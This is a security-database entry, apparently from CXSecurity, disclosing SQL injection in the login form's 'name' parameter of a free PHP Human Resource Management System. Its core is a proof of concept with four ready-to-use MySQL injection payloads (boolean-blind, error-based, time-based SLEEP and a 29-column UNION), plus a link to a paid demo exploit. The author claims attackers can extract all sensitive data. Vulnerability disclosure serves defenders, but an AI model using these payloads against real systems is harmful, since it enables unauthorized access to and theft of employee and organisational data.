---
title: © 2024 Human Resource Management-1.0-HRM-1.0 Multiple-SQLi
url: https://cxsecurity.com/issue/WLB-2024110023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-15
fetch_date: 2025-10-06T19:16:56.184043
---

# © 2024 Human Resource Management-1.0-HRM-1.0 Multiple-SQLi

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **© 2024 Human Resource Management-1.0-HRM-1.0 Multiple-SQLi** **2024.11.14**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: © 2024 Human Resource Management-1.0-HRM-1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 11/13/2024
## Vendor: https://github.com/oretnom23
## Software: https://www.sourcecodester.com/php/15740/human-resource-management-system-project-php-and-mysql-free-source-code.html
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `name` parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the name parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present. The attacker can get all sensitive information from this system when he attacks it online!
STATUS: HIGH- Vulnerability
[+]PoC:
- SQLi Multiple:
```mysql
---
Parameter: name (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
Payload: name=LveNsMvG@burpcollaborator.net' OR NOT 8671=8671# OCYA&password=c7C!j0m!B6&submit=Sign In
Type: error-based
Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: name=LveNsMvG@burpcollaborator.net' OR (SELECT 2245 FROM(SELECT COUNT(\*),CONCAT(0x71787a7071,(SELECT (ELT(2245=2245,1))),0x7162767671,FLOOR(RAND(0)\*2))x FROM INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a)# oQPr&password=c7C!j0m!B6&submit=Sign In
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: name=LveNsMvG@burpcollaborator.net' AND (SELECT 6373 FROM (SELECT(SLEEP(7)))TmMs)# EEtl&password=c7C!j0m!B6&submit=Sign In
Type: UNION query
Title: MySQL UNION query (NULL) - 29 columns
Payload: name=LveNsMvG@burpcollaborator.net' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71787a7071,0x6f756b716a7659416b6f796f444768675876424c5a46656b796e68564576416a7a6a63526c4d4b52,0x7162767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&password=c7C!j0m!B6&submit=Sign In
---
```
## Info:
[href](https://www.nu11secur1ty.com/2024/11/2024-human-resource-management-10-hrm\_13.html)
## Demo Exploit:
[href](https://www.patreon.com/posts/c-2024-human-1-0-115907878)
## Time spent:
00:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top